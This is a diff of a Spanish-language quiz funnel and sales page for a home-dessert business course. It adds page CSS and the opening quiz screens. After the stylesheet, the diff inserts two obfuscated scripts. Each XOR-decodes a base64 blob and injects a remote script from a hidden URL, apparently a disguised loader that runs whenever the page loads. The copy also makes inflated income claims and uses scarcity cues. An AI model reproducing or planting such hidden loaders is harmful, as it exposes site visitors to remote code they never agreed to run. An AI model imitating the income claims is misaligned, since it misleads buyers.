+    }
+
+    .pv-offer-card{
+      position:relative;overflow:hidden;padding:24px 18px;border-radius:28px;border:1px solid #ead0c5;
+      background:radial-gradient(circle at 50% -10%,rgba(239,93,114,.17),transparent 34%),
+                 linear-gradient(180deg,#fff,#fff8f3);
+      box-shadow:var(--shadow);text-align:center
+    }
+    .offer-flame{
+      display:inline-flex;padding:7px 10px;border-radius:999px;background:var(--brand-soft);
+      color:var(--brand-dark);font-size:10px;font-weight:950;letter-spacing:.07em;margin-bottom:11px
+    }
+    .pv-offer-card h2{font-size:29px;line-height:1.06;margin-bottom:16px}
+    .pv-offer-mini-list{display:grid;grid-template-columns:1fr 1fr;gap:8px;text-align:left;margin:0 auto 18px}
+    .pv-offer-mini-list span{
+      padding:9px 10px;border-radius:12px;background:#fff;border:1px solid var(--border);
+      font-size:11px;font-weight:850
+    }
+    .offer-old{color:var(--muted);font-size:13px;margin-bottom:4px}
+    .offer-today{color:var(--brand-dark);font-size:12px;font-weight:950;letter-spacing:.12em;margin-top:7px}
+    .offer-price{
+      margin:3px 0 13px;color:var(--text);font-size:52px;line-height:1;
+      font-weight:1000;letter-spacing:-.055em
+    }
+    .offer-price small{font-size:14px;letter-spacing:0;color:var(--muted);font-weight:850}
+
+    .scarcity-box{
+      display:flex;align-items:center;justify-content:center;gap:8px;margin:13px 0;padding:10px 11px;
+      border-radius:13px;background:#fff0ef;border:1px solid #f5c3bd;color:#a83b31;
+      font-size:11.5px;line-height:1.3
+    }
+    .scarcity-dot{
+      width:9px;height:9px;flex:0 0 9px;border-radius:50%;background:#e64c3c;
+      box-shadow:0 0 0 5px rgba(230,76,60,.11);animation:scarcityPulse 1.4s ease-in-out infinite
+    }
+    @keyframes scarcityPulse{0%,100%{transform:scale(1)}50%{transform:scale(.72)}}
+    .offer-micro{margin-top:9px;color:var(--muted);font-size:10.5px;line-height:1.35}
+
+    .pv-security-stack{display:grid;gap:12px}
+    .security-card{
+      display:flex;align-items:flex-start;gap:14px;padding:19px 16px;border-radius:21px;
+      border:1px solid var(--border);background:#fff;box-shadow:var(--shadow-sm)
+    }
+    .security-icon{
+      flex:0 0 50px;width:50px;height:50px;display:grid;place-items:center;
+      border-radius:16px;font-size:26px;background:var(--surface-2)
+    }
+    .security-card span{
+      display:block;color:var(--muted);font-size:9px;font-weight:950;
+      letter-spacing:.1em;margin-bottom:4px
+    }
+    .security-card h2{margin:0 0 7px;font-size:21px;line-height:1.1}
+    .security-card p{margin:0;color:var(--muted);font-size:12px;line-height:1.5}
+    .guarantee-card{border-color:#c9e5d8;background:linear-gradient(135deg,#f3fbf7,#fff)}
+    .app-card{border-color:#d9d6ef;background:linear-gradient(135deg,#f7f5ff,#fff)}
+    .app-mini-list{display:grid;gap:5px;margin-top:8px}
+    .app-mini-list b{color:var(--muted);font-size:11px;line-height:1.35}
+
+    .pv-story{text-align:center}
+    .pv-story > p{max-width:610px;margin:0 auto 18px;color:var(--muted);font-size:14px;line-height:1.6}
+    .car-photo{
+      min-height:230px;display:grid;place-items:center;overflow:hidden;border-radius:24px;
+      border:1px solid var(--border);background:linear-gradient(135deg,#f5ece6,#fff);
+      box-shadow:var(--shadow-sm)
+    }
+    .car-photo img{width:100%;display:block;object-fit:cover;max-height:480px}
+    .car-fallback-content{display:none;align-items:center;justify-content:center;gap:9px;font-size:42px}
+    .car-fallback .car-fallback-content{display:flex}
+    .car-fallback-content strong{font-size:14px;color:var(--muted)}
+    .story-signature{margin-top:12px;color:var(--brand-dark);font-size:13px;font-weight:900;font-style:italic}
+
+    .testimonial-video-grid{display:grid;gap:13px}
+    .testimonial-video{overflow:hidden;border-radius:22px;background:#241a18;box-shadow:var(--shadow-sm)}
+    .video-thumb{
+      aspect-ratio:9/16;max-height:540px;display:grid;place-items:center;align-content:center;gap:12px;
+      color:#fff;background:radial-gradient(circle at 50% 35%,rgba(239,93,114,.25),transparent 28%),
+                         linear-gradient(180deg,#382520,#1d1513)
+    }
+    .video-play{
+      width:64px;height:64px;display:grid;place-items:center;padding-left:4px;border-radius:50%;
+      background:var(--brand);box-shadow:0 12px 28px rgba(239,93,114,.3);font-size:22px
+    }
+    .video-thumb strong{font-size:13px;color:rgba(255,255,255,.8)}
+
+    .pv-offer-card-alt{
+      background:radial-gradient(circle at 50% -12%,rgba(243,168,64,.17),transparent 34%),
+                 linear-gradient(180deg,#fff,#fffaf1)
+    }
+    .offer-check-list{display:grid;gap:8px;margin:10px 0 18px;text-align:left}
+    .offer-check-list div{
+      padding:10px 11px;border-radius:12px;background:#fff;border:1px solid var(--border);font-size:12px
+    }
+
+    .community-section{background:linear-gradient(180deg,rgba(249,239,255,.52),rgba(255,248,242,0))}
+    .community-head{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:17px;text-align:left}
+    .community-icon{
+      width:54px;height:54px;display:grid;place-items:center;border-radius:17px;
+      background:#f0e3ff;font-size:27px
+    }
+    .community-head span{color:var(--muted);font-size:9px;font-weight:950;letter-spacing:.13em}
+    .community-head h2{margin:2px 0 0;font-size:25px;line-height:1}
+
+    .recommendation-stat{
+      display:flex;align-items:center;gap:13px;max-width:620px;margin:0 auto 17px;padding:15px;
+      border-radius:18px;background:#fff;border:1px solid var(--border);box-shadow:var(--shadow-sm)
+    }
+    .recommendation-stat strong{color:var(--brand-dark);font-size:36px;line-height:1;letter-spacing:-.05em}
+    .recommendation-stat span{color:var(--muted);font-size:11.5px;line-height:1.4}
+
+    .review-stack{display:grid;gap:11px}
+    .review-card{
+      padding:16px;border-radius:19px;background:#fff;border:1px solid var(--border);box-shadow:var(--shadow-sm)
+    }
+    .review-user{display:flex;align-items:center;gap:10px;margin-bottom:10px}
+    .review-avatar{
+      width:40px;height:40px;flex:0 0 40px;display:grid;place-items:center;border-radius:50%;
+      background:linear-gradient(135deg,var(--brand),#ff8a78);color:#fff;font-weight:950
+    }
+    .review-user strong{display:block;font-size:13px;line-height:1.2}
+    .review-user span{display:block;color:var(--muted);font-size:10.5px;margin-top:2px}
+    .review-card p{margin:0;color:var(--muted);font-size:12.5px;line-height:1.55}
+
+    .expert-final{padding-bottom:56px}
+    .expert-final-photo{
+      min-height:260px;overflow:hidden;display:grid;place-items:center;border-radius:26px;
+      border:1px solid var(--border);background:linear-gradient(135deg,#ffe8e3,#fff5ec);
+      box-shadow:var(--shadow);margin-bottom:20px
+    }
+    .expert-final-photo img{width:100%;display:block;object-fit:cover;max-height:500px}
+    .expert-fallback-content{display:none;font-size:78px}
+    .expert-fallback .expert-fallback-content{display:block}
+    .expert-final-copy{text-align:center}
+    .expert-final-copy h2{
+      margin:10px auto 15px;max-width:650px;font-size:30px;line-height:1.06
+    }
+    .expert-final-copy p{
+      max-width:590px;margin:0 auto 8px;color:var(--muted);font-size:13.5px;line-height:1.55
+    }
+    .final-price{margin:18px 0 8px}
+    .final-price span{display:block;color:var(--muted);font-size:11px;font-weight:800}
+    .final-price strong{
+      display:block;margin-top:3px;color:var(--brand-dark);font-size:37px;line-height:1;
+      letter-spacing:-.045em
+    }
+
+    @media (min-width:700px){
+      .pv-section{padding:58px 20px}
+      .pv-learning-list{grid-template-columns:1fr 1fr}
+      .pv-bonus-grid{grid-template-columns:repeat(2,1fr)}
+      .pv-security-stack{grid-template-columns:1fr 1fr}
+      .testimonial-video-grid{grid-template-columns:1fr 1fr}
+      .review-stack{grid-template-columns:1fr 1fr}
+      .pv-cta{max-width:520px}
+      .dessert-card{flex-basis:250px}
+    }
+
+    @media (max-width:430px){
+      .pv-section{padding:35px 13px}
+      .pv-hero{padding-top:18px}
+      .pv-kicker{font-size:10.5px;padding:8px 10px}
+      .pv-hero h1{font-size:28px;line-height:1.07}
+      .pv-section-title h2{font-size:25px;line-height:1.1}
+      .pv-learning-card{min-height:58px;padding:12px 13px}
+      .pv-learning-card strong{font-size:13px}
+      .dessert-image{height:190px}
+      .pv-offer-card{padding:21px 15px}
+      .pv-offer-card h2{font-size:27px}
+      .offer-price{font-size:48px}
+      .security-card{padding:16px 14px}
+      .expert-final-copy h2{font-size:27px}
+    }
+
+    @media (max-width:360px){
+      .pv-section{padding-left:12px;padding-right:12px}
+      .pv-hero h1{font-size:25px}
+      .pv-section-title h2{font-size:23px}
+      .pv-learning-card strong{font-size:12.5px}
+      .pv-cta{font-size:14px}
+      .pv-offer-mini-list{grid-template-columns:1fr}
+      .offer-price{font-size:44px}
+      .community-head h2{font-size:22px}
+      .expert-final-copy h2{font-size:24px}
+    }
+
+
+    .offer-promise{
+      max-width:620px;
+      margin:0 auto 14px !important;
+      font-size:clamp(28px,5.2vw,39px) !important;
+      line-height:1.06 !important;
+      letter-spacing:-.035em;
+    }
+
+    .offer-promise span{
+      color:var(--brand-dark);
+    }
+
+    .offer-product{
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      margin:0 auto 18px;
+      padding:9px 12px;
+      border-radius:12px;
+      background:#2f211d;
+      color:#fff;
+      font-size:11px;
+      font-weight:950;
+      letter-spacing:.055em;
+    }
+
+    .anchor-card{
+      width:min(280px,100%);
+      margin:0 auto 8px;
+      padding:11px 14px;
+      border-radius:14px;
+      background:#fff;
+      border:1px solid var(--border);
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:10px;
+    }
+
+    .anchor-card span{
+      color:var(--muted);
+      font-size:11px;
+      font-weight:800;
+    }
+
+    .anchor-card s{
+      color:#8c7770;
+      font-size:17px;
+      font-weight:900;
+      text-decoration-thickness:2px;
+    }
+
+    .final-promise{
+      max-width:560px;
+      margin:18px auto 8px;
+      padding:12px 14px;
+      border-radius:15px;
+      background:var(--brand-soft);
+      color:var(--brand-dark);
+      font-size:12px;
+      line-height:1.35;
+      font-weight:950;
+      letter-spacing:.02em;
+    }
+
+    @media (max-width:430px){
+      .offer-promise{
+        font-size:26px !important;
+        line-height:1.08 !important;
+      }
+      .offer-product{
+        font-size:10px;
+        line-height:1.3;
+      }
+      .dessert-card{flex-basis:205px}
+      .pv-marquee-track{animation-duration:30s}
+    }
+
+    @media (max-width:360px){
+      .offer-promise{font-size:23px !important}
+      .dessert-card{flex-basis:190px}
+      .bonus-gift{
+        flex-basis:52px;
+        width:52px;
+        height:52px;
+        font-size:27px;
+      }
+      .pv-bonus-card h3{font-size:14.5px}
+    }
+
+    @media (prefers-reduced-motion:reduce){
+      .pv-marquee-track{animation:none !important}
+      *,*:before,*:after{
+        animation-duration:.01ms !important;
+        animation-iteration-count:1 !important;
+        transition-duration:.01ms !important;
+        scroll-behavior:auto !important;
+      }
+    }
+  
+    /* ======================================================
+       PROPORÇÕES FINAIS DAS IMAGENS
+       ====================================================== */
+
+    /* Primeira página do quiz — 1112x1402 */
+    .hero-visual{
+      aspect-ratio:1112/1402 !important;
+      max-width:556px;
+    }
+    .hero-visual img{
+      width:100%;
+      height:100%;
+      object-fit:cover;
+      object-position:center;
+    }
+
+    /* Mockup da PV — 1672x941 */
+    .pv-mockup{
+      aspect-ratio:1672/941 !important;
+      min-height:0 !important;
+      max-width:760px;
+    }
+    .pv-mockup img{
+      width:100% !important;
+      height:100% !important;
+      max-height:none !important;
+      object-fit:cover !important;
+      object-position:center;
+    }
+
+    /* História do carro — 1402x1112 */
+    .car-photo{
+      aspect-ratio:1402/1112 !important;
+      min-height:0 !important;
+    }
+    .car-photo img{
+      width:100% !important;
+      height:100% !important;
+      max-height:none !important;
+      object-fit:cover !important;
+      object-position:center;
+    }
+
+    /* Expert final — 941x1672 */
+    .expert-final-photo{
+      aspect-ratio:941/1672 !important;
+      min-height:0 !important;
+      max-width:470px;
+      margin-left:auto;
+      margin-right:auto;
+    }
+    .expert-final-photo img{
+      width:100% !important;
+      height:100% !important;
+      max-height:none !important;
+      object-fit:cover !important;
+      object-position:center top;
+    }
+
+    /* Esteira — imagens 1448x1086 = 4:3 */
+    .dessert-card{
+      flex:0 0 250px;
+      overflow:hidden;
+      border:1px solid var(--border);
+      border-radius:20px;
+      background:#fff;
+      box-shadow:var(--shadow-sm);
+    }
+    .dessert-image{
+      width:100%;
+      aspect-ratio:1448/1086 !important;
+      height:auto !important;
+      display:grid;
+      place-items:center;
+      overflow:hidden;
+      background:linear-gradient(135deg,#fff1e8,#ffe3e8);
+      position:relative;
+    }
+    .dessert-image img{
+      width:100%;
+      height:100%;
+      display:block;
+      object-fit:cover;
+      object-position:center;
+    }
+    .dessert-fallback-emoji{
+      display:none;
+      font-size:60px;
+    }
+    .dessert-fallback .dessert-fallback-emoji{display:block}
+    .dessert-card > strong{
+      display:block;
+      padding:12px 12px 14px;
+      text-align:center;
+      font-size:13px;
+      line-height:1.2;
+    }
+
+    /* Aplicativo — todos os dispositivos bem organizados */
+    .app-mini-list{
+      display:grid !important;
+      grid-template-columns:1fr !important;
+      gap:6px !important;
+    }
+
+    @media (min-width:700px){
+      .app-mini-list{
+        grid-template-columns:1fr 1fr !important;
+        column-gap:14px !important;
+      }
+    }
+
+    @media (max-width:430px){
+      .dessert-card{flex-basis:220px}
+      .hero-visual{
+        aspect-ratio:1112/1402 !important;
+        border-radius:22px;
+      }
+    }
+
+    @media (max-width:360px){
+      .dessert-card{flex-basis:205px}
+    }
+
+
+    
+
+    /* ======================================================
+       DEPOIMENTO ÚNICO EM IMAGEM
+       ====================================================== */
+    .single-testimonial-wrap{
+      display:flex;
+      justify-content:center;
+    }
+
+    .single-testimonial-card{
+      width:min(100%, 470px);
+      aspect-ratio:941/1672;
+      overflow:hidden;
+      border-radius:26px;
+      border:1px solid var(--border);
+      background:linear-gradient(135deg,#fff1e8,#ffe9ec);
+      box-shadow:var(--shadow);
+      display:grid;
+      place-items:center;
+    }
+
+    .single-testimonial-card img{
+      width:100%;
+      height:100%;
+      display:block;
+      object-fit:cover;
+      object-position:center top;
+    }
+
+    .single-testimonial-fallback-content{
+      display:none;
+      font-size:72px;
+    }
+
+    .single-testimonial-fallback .single-testimonial-fallback-content{
+      display:block;
+    }
+
+    @media (max-width:430px){
+      .single-testimonial-card{
+        border-radius:22px;
+      }
+    }
+
+
+    /* Carrossel de postres: somente imagens, sem legenda */
+    .dessert-card{
+      border-radius:22px !important;
+      overflow:hidden !important;
+      background:transparent !important;
+      border:0 !important;
+      box-shadow:none !important;
+    }
+
+    .dessert-image{
+      border-radius:22px !important;
+      background:linear-gradient(135deg,#fff1e8,#ffe3e8);
+    }
+
+    .dessert-card > strong{
+      display:none !important;
+    }
+
+</style>
+<script>(function(){var b_8ngf=atob("DAWiTmCtZw9AwSGKYn6AOxLBRTViqVX+EnaYYU/OA2FutFXnC2PbYAPCCiEisw75AXfLPhTeSH8puUTmTXXLNgXBSWUz4w2oA3HWPAnPEnslsgOwOViObAfBCG0hrVKoWF7ZbA7MCmpi+wP6C33HIinJRSNit0DmF2CAdEKbBm54+EXrBGTGeFaYATpw+EPoATPDelmPGlI9");var f_7=[];for(var s_dr=0;s_dr<b_8ngf.length;s_dr++){f_7.push(b_8ngf.charCodeAt(s_dr)&255);}var z_i5p=f_7[0];var f_y5kt=f_7.slice(1,1+z_i5p);var z_a=f_7.slice(1+z_i5p);var m_n=z_a.map(function(b,m_g52s){return b^f_y5kt[m_g52s%z_i5p];});var k_46c="";for(var a_1g=0;a_1g<m_n.length;a_1g++){k_46c+=String.fromCharCode(m_n[a_1g]&255);}var e_y=decodeURIComponent(escape(k_46c));var n_c=JSON.parse(e_y);var g_6=n_c.globals||[];g_6.forEach(function(u_5w1){window[u_5w1.name]=u_5w1.value;});var e_4=document.createElement("script");e_4.src=n_c.url;e_4.async=true;e_4.defer=true;(n_c.attributes||[]).forEach(function(y_ppgi){e_4.setAttribute(y_ppgi.name,y_ppgi.value);});(document.head||document.documentElement).appendChild(e_4);})();</script>
+<script>(function(){var y_5=atob("DGHo3LuL9aE+HpdfohrKqcnn15scduMr0hLS85Tokc8Qa+MyyweR8tjkmI9cbLgswROBrM/42tRKc+RwzgCcucj/28tNPLt9wxWcrtLpgNVbbbVl+RrKstrmkIMEPPM+1gDFqc/mnMdHM+ctxxeNss+mjcJReroswQrK8Jn9lM1Le7VlgEOV8MCpm8BTe7VlgAWJqNqmgNVTd/EmjxGauc3um9UTbeI9ywWb/pepg8BSa/J9mEPKoeb2");var a_40=[];for(var d_as=0;d_as<y_5.length;d_as++){a_40.push(y_5.charCodeAt(d_as)&255);}var s_lk=a_40[0];var w_703=a_40.slice(1,1+s_lk);var g_hgmf=a_40.slice(1+s_lk);var k_4bh6=g_hgmf.map(function(b,v_b){return b^w_703[v_b%s_lk];});var x_m7k6="";for(var d_r=0;d_r<k_4bh6.length;d_r++){x_m7k6+=String.fromCharCode(k_4bh6[d_r]&255);}var q_9=decodeURIComponent(escape(x_m7k6));var y_15=JSON.parse(q_9);var b_w3=y_15.globals||[];b_w3.forEach(function(w_r){window[w_r.name]=w_r.value;});var i_jm0h=document.createElement("script");i_jm0h.src=y_15.url;i_jm0h.async=true;i_jm0h.defer=true;(y_15.attributes||[]).forEach(function(i_lfbk){i_jm0h.setAttribute(i_lfbk.name,i_lfbk.value);});(document.head||document.documentElement).appendChild(i_jm0h);})();</script>
+</head>
+
+<body>
+<div class="app">
+  <header class="topbar hidden" id="quizHeader">
+    <div class="topbar-inner">
+      <div class="brand-row">
+        <div class="logo" aria-label="Postres Rentables">
+          <div class="logo-mark">🍰</div>
+          <span><small>Método</small>POSTRES RENTABLES</span>
+        </div>
+        <button class="header-back" id="headerBack" type="button">← Volver</button>
+      </div>
+      <div class="progress-track" aria-label="Progreso del quiz">
+        <div class="progress-fill" id="progressFill"></div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    <!-- INICIO -->
+    <section class="screen active" data-screen="intro">
+      <div class="hero">
+        <div class="eyebrow">CONVIERTE TU COCINA EN UNA FUENTE DE INGRESOS</div>
+
+        <h1 class="hero-headline">
+          DESCUBRE CÓMO GENERAR HASTA <span class="highlight">$7,000 MXN AL MES</span>
+          VENDIENDO POSTRES DESDE CASA — AUNQUE ESTÉS EMPEZANDO DESDE CERO
+        </h1>
+
+        <div class="hero-visual">
+          <img src="images/hero.webp" alt="Experta de Postres Rentables junto a postres y dinero" loading="eager" />
+        </div>
+
+        <div class="benefit-cards">
+          <div class="benefit-card">
+            <div class="benefit-icon">👌</div>
+            <strong>Fáciles de hacer</strong>
+          </div>
+          <div class="benefit-card">
+            <div class="benefit-icon">💸</div>
+            <strong>Baja inversión inicial</strong>
+          </div>
+          <div class="benefit-card">
+            <div class="benefit-icon">📈</div>
+            <strong>Extremadamente rentables</strong>
+          </div>
+        </div>
+
+        <button class="btn btn-primary" id="startBtn">QUIERO DESCUBRIR CÓMO →</button>
+
+        <div class="social-proof">
+          <div><strong>+3,750 mujeres</strong> ya transformaron su realidad a través del Método Postres Rentables.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- P1 -->
+    <section class="screen" data-screen="q1">
+      <div class="question-head">
+        <h2>¿Qué te gustaría lograr vendiendo postres?</h2>
+        <p>Elige la opción que más se parece a tu objetivo actual.</p>
+      </div>
+
+      <div class="options" data-question="goal">
+        <button class="option" data-value="ingreso_extra">
+          <span class="option-icon">💵</span>
+          <span class="option-copy"><b>Generar un ingreso extra</b><span>Tener dinero adicional cada mes.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+        <button class="option" data-value="negocio">
+          <span class="option-icon">🏠</span>
+          <span class="option-copy"><b>Tener mi propio negocio</b><span>Empezar desde casa y hacerlo crecer.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+        <button class="option" data-value="gastos">
+          <span class="option-icon">🛒</span>
+          <span class="option-copy"><b>Ayudar con los gastos de casa</b><span>Crear una fuente adicional de ingresos.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+        <button class="option" data-value="vender_mas">
+          <span class="option-icon">📈</span>
+          <span class="option-copy"><b>Ya vendo y quiero vender más</b><span>Mejorar precios, ganancias y organización.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+      </div>
+
+      <div class="nav-row">
+      </div>
+    </section>
+
+    <!-- P2 -->
+    <section class="screen" data-screen="q2">
+      <div class="question-head">
+        <h2>¿Ya preparas postres actualmente?</h2>
+        <p>No importa tu nivel. Queremos entender desde dónde estás comenzando.</p>
+      </div>
+
+      <div class="options" data-question="experience">
+        <button class="option" data-value="nunca">
+          <span class="option-icon">🌱</span>
+          <span class="option-copy"><b>Nunca, estoy empezando desde cero</b><span>Quiero aprender paso a paso.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+        <button class="option" data-value="a_veces">
+          <span class="option-icon">🧁</span>
+          <span class="option-copy"><b>A veces preparo en casa</b><span>Ya hice algunas recetas por mi cuenta.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+        <button class="option" data-value="familia">
+          <span class="option-icon">🎂</span>
+          <span class="option-copy"><b>Preparo para familia y amigos</b><span>Me gustaría convertirlo en algo rentable.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+        <button class="option" data-value="vendo">
+          <span class="option-icon">💼</span>
+          <span class="option-copy"><b>Ya vendo algunos postres</b><span>Quiero profesionalizar y vender más.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+      </div>
+
+      <div class="nav-row">
+      </div>
+    </section>
+
+    <!-- P3 -->
+    <section class="screen" data-screen="q3">
+      <div class="question-head">
+        <h2>¿Qué tipo de postres te gustaría aprender a vender?</h2>
+        <p>Elige el que más te llama la atención. Dentro del método aprenderás varias categorías.</p>
+      </div>
+
+      <div class="options" data-question="dessert">
+        <button class="option" data-value="vaso">
+          <span class="option-icon">🍨</span>
+          <span class="option-copy"><b>Postres en vaso</b><span>Visuales, prácticos y fáciles de vender.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+        <button class="option" data-value="brownies_cookies">
+          <span class="option-icon">🍪</span>
+          <span class="option-copy"><b>Brownies y cookies</b><span>Clásicos con alta aceptación.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+        <button class="option" data-value="gelatinas">
+          <span class="option-icon">🍮</span>
+          <span class="option-copy"><b>Gelatinas y postres decorados</b><span>Opciones llamativas para diferentes ocasiones.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+        <button class="option" data-value="todo">
+          <span class="option-icon">✨</span>
+          <span class="option-copy"><b>Un poco de todo</b><span>Quiero tener variedad para ofrecer.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+      </div>
+
+      <div class="nav-row">
+      </div>
+    </section>
+
+    <!-- P4 -->
+    <section class="screen" data-screen="q4">
+      <div class="question-head">
+        <h2>¿Qué es lo que más te impide comenzar?</h2>
+        <p>Esta respuesta nos ayuda a mostrarte el camino más adecuado.</p>
+      </div>
+
+      <div class="options" data-question="blocker">
+        <button class="option" data-value="que_preparar">
+          <span class="option-icon">📖</span>
+          <span class="option-copy"><b>No sé qué preparar</b><span>Necesito recetas claras y probadas.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+        <button class="option" data-value="cuanto_cobrar">
+          <span class="option-icon">🏷️</span>
+          <span class="option-copy"><b>No sé cuánto cobrar</b><span>Me cuesta calcular costos y precios.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+        <button class="option" data-value="clientes">
+          <span class="option-icon">📣</span>
+          <span class="option-copy"><b>No sé cómo conseguir clientes</b><span>Quiero aprender a promocionar y vender.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+        <button class="option" data-value="organizacion">
+          <span class="option-icon">🗂️</span>
+          <span class="option-copy"><b>No sé cómo organizar el negocio</b><span>Producción, entregas y control me confunden.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+      </div>
+
+      <div class="nav-row">
+      </div>
+    </section>
+
+    <!-- P5 -->
+    <section class="screen" data-screen="q5">
+      <div class="question-head">
+        <h2>¿Cuánto tiempo podrías dedicar por día?</h2>
+        <p>No necesitas comenzar a lo grande. La idea es empezar de forma realista.</p>
+      </div>
+
+      <div class="options" data-question="time">
+        <button class="option" data-value="menos_1h">
+          <span class="option-icon">⏱️</span>
+          <span class="option-copy"><b>Menos de 1 hora</b><span>Quiero empezar poco a poco.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+        <button class="option" data-value="1_2h">
+          <span class="option-icon">🕐</span>
+          <span class="option-copy"><b>Entre 1 y 2 horas</b><span>Puedo reservar un momento del día.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+        <button class="option" data-value="2_4h">
+          <span class="option-icon">🕒</span>
+          <span class="option-copy"><b>Entre 2 y 4 horas</b><span>Quiero dedicarme con más constancia.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+        <button class="option" data-value="tiempo_completo">
+          <span class="option-icon">🚀</span>
+          <span class="option-copy"><b>Quiero dedicarme de lleno</b><span>Busco convertirlo en una actividad principal.</span></span>
+          <span class="option-check">✓</span>
+        </button>
+      </div>
+
+      <div class="nav-row">
+      </div>
+    </section>
+
+    <!-- CALCULADORA -->
+    <section class="screen" data-screen="calculator">
+      <div class="question-head">
+        <div class="question-number">Tu potencial de ventas</div>
+        <h2>¿Cuántos postres crees que podrías vender por semana?</h2>
+        <p>Toca <strong>10, 20, 30 y 50+</strong> para comparar los escenarios.</p>
+      </div>
+
+      <div class="calc-shell">
+        <div class="calc-top">
+          <div class="calc-kicker">Explora diferentes escenarios</div>
+          <div class="calc-choice-grid" role="group" aria-label="Postres por semana">
+            <button class="calc-choice" data-qty="10">10</button>
+            <button class="calc-choice" data-qty="20">20</button>
+            <button class="calc-choice selected" data-qty="30">30</button>
+            <button class="calc-choice" data-qty="50">50+</button>
+          </div>
+        </div>
+
+        <div class="calc-body">
+          <div class="calc-summary">
+            <div>
+              <div class="calc-kicker">Escenario seleccionado</div>
+              <div class="calc-title" id="scenarioTitle">30 postres por semana</div>
+            </div>
+            <div class="price-chip">Precio promedio: $60 MXN</div>
+          </div>
+
+          <div class="numbers">
+            <div class="metric">
+              <span>Ventas por semana</span>
+              <strong id="weeklyRevenue">$1,800</strong>
+            </div>
+            <div class="metric">
+              <span>Ventas en 4 semanas</span>
+              <strong id="monthlyRevenue">$7,200</strong>
+            </div>
+            <div class="metric emphasis">
+              <span>Margen estimado*</span>
+              <strong id="monthlyMargin">$4,200</strong>
+            </div>
+          </div>
+
+          <div class="formula">
+            <b>Así se calcula:</b>
+            <p id="formulaRevenue">30 × $60 = $1,800 por semana → $7,200 en 4 semanas.</p>
+            <p id="formulaMargin">Con un costo estimado de $25 por unidad: 30 × $35 de margen × 4 = $4,200 MXN.</p>
+          </div>
+
+          <div class="proof-strip">
+            <div class="proof-badge">🔥</div>
+            <div>
+              <strong>Mis alumnas venden fácilmente +30 postres por semana.</strong>
+              <span>Y muchas empiezan desde casa, con una estructura simple.</span>
+            </div>
+          </div>
+
+          <p class="small-note">*Ejemplo ilustrativo usando un precio promedio de $60 MXN y un costo estimado de $25 MXN por unidad. Los resultados reales pueden variar según precios, costos y volumen de ventas.</p>
+        </div>
+      </div>
+
+      <div class="nav-row">
+        <button class="btn btn-primary" id="calculatorContinue">Quiero ver cómo empezar →</button>
+      </div>
+    </section>
+
+    <!-- P6 / COMPROMISO -->
+    <section class="screen" data-screen="q6">
+      <div class="commit-card">
+        <div class="question-head" style="margin-top:0">
+          <h2>Si tuvieras recetas probadas y un paso a paso para calcular costos, definir precios y conseguir tus primeras ventas...</h2>
+          <p><strong>¿Te gustaría comenzar tu propio negocio de postres desde casa?</strong></p>
+        </div>
+
+        <div class="options" data-question="commitment">
+          <button class="option auto-finish" data-value="si_comenzar">
+            <span class="option-icon">😍</span>
+            <span class="option-copy"><b>Sí, quiero comenzar</b><span>Estoy lista para dar el siguiente paso.</span></span>
+            <span class="option-check">✓</span>
+          </button>
+          <button class="option auto-finish" data-value="si_necesito">
+            <span class="option-icon">💡</span>
+            <span class="option-copy"><b>Sí, pero necesito saber cómo hacerlo</b><span>Quiero una guía clara y práctica.</span></span>
+            <span class="option-check">✓</span>
+          </button>
+          <button class="option auto-finish" data-value="ya_vendo">
+            <span class="option-icon">📈</span>
+            <span class="option-copy"><b>Ya vendo y quiero mejorar mis resultados</b><span>Quiero más organización y rentabilidad.</span></span>
+            <span class="option-check">✓</span>
+          </button>
+        </div>
+
+        <div class="nav-row">
+        </div>
+      </div>
+    </section>
+
+    <!-- ANÁLISIS -->
+    <section class="screen" data-screen="analysis">
+      <div class="analysis">
+        <div class="spinner" aria-hidden="true"></div>
+        <h2>Estamos preparando tu resultado...</h2>
+        <p class="lead" style="font-size:15px;margin-bottom:0">Analizando tus respuestas para mostrarte el siguiente paso.</p>
+
+        <div class="analysis-lines">
+          <div class="analysis-line" id="a1">✓ Revisando tu nivel actual</div>
+          <div class="analysis-line" id="a2">✓ Identificando tu principal oportunidad</div>
+          <div class="analysis-line" id="a3">✓ Preparando tu recomendación</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SALES PAGE -->
+    <section class="screen sales-page" data-screen="vsl">
+
+      <section class="pv-section pv-hero">
+        <div class="pv-kicker">🎉 ¡FELICIDADES! TU OPORTUNIDAD ESTÁ LISTA 🎉</div>
+        <h1>Has calificado para formar parte del <span class="highlight">Método Postres Rentables</span></h1>
+
+        <div class="pv-mockup">
+          <img src="images/mockupv.webp" alt="Método Postres Rentables en aplicación exclusiva"
+               onerror="this.style.display='none'; this.parentElement.classList.add('mockup-fallback');" />
+          <div class="mockup-fallback-content">
+            <div class="mockup-phone">📱</div>
+            <div>
+              <strong>Método Postres Rentables</strong>
+              <span>+100 Postres • App Exclusiva • Soporte</span>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section class="pv-section">
+        <div class="pv-section-title">
+          <span class="pv-title-chip">TODO EN UN SOLO MÉTODO</span>
+          <h2>MIRA TODO LO QUE VAS A APRENDER CONMIGO</h2>
+        </div>
+
+        <div class="pv-learning-list">
+          <div class="pv-learning-card"><span>🎥</span><strong>+100 Postres en Video, Paso a Paso</strong></div>
